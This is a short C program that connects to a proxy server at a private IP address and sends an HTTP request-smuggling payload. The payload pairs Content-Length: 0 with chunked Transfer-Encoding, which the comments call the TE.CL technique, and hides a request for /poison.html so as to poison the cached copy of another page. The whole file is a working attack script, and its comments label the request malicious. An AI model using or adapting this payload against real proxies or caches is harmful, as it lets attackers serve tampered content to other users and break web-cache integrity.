#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define TARGET_IP "192.168.1.202"  // Proxy server IP
#define TARGET_PORT 8080           // Proxy port

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char request[1024];
    char buffer[4096];

    
    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        //perror("Socket creation failed");
        return 1;
    }

    // Setup server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);
    server_addr.sin_addr.s_addr = inet_addr(TARGET_IP);

    // Connect to the proxy server
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        //perror("Connection failed");
        close(sock);
        return 1;
    }
    // 💡 Updated request with Connection: Keep-Alive and TE.CL technique
    snprintf(request, sizeof(request),
        "POST /doomle.html HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: 0\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n"
        
        "32\r\n"
        "GET /poison.html HTTP/1.1\r\n"//35
        "Host: 192.168.1.202\r\n\r\n"//23
        "\r\n0\r\n\r\n"

        "GET /page_to_poison.html HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n\r\n");


    // Send the malicious request
    if (send(sock, request, strlen(request), 0) < 0) {
        //perror("Send failed");
        close(sock);
        return 1;
    }

    // Wait for a response
    int received =recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received > 0) {
        buffer[received] = '\0';
    } 

    // Close socket
    close(sock);

    return 0;
}
